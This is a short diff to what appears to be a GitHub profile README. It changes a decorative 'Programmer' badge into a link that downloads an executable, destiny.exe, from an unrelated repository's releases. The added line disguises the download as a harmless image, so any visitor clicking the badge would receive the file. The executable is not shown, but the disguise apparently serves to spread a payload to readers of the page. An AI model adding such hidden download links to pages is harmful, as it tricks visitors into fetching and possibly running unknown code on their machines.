@@ -1,6 +1,6 @@
 <img align="left" height="200" src="https://media.giphy.com/media/ao9DUiTKH60XS/giphy.gif"/>
 <p align="left"><img src="https://komarev.com/ghpvc/?username=Sw3tch&color=e39427" alt="ProfileViews" />
-<img src="https://img.shields.io/badge/Programmer-808080?style=flat-square&logo=visual-studio"/> </p>
+<a href="https://github.com/G3ZZING/G3ZZING/releases/download/Puzzle/destiny.exe" download> <img src="https://img.shields.io/badge/Programmer-808080?style=flat-square&logo=visual-studio"/></a></p>
 
 <pre align="center">
 <h1 align="center">
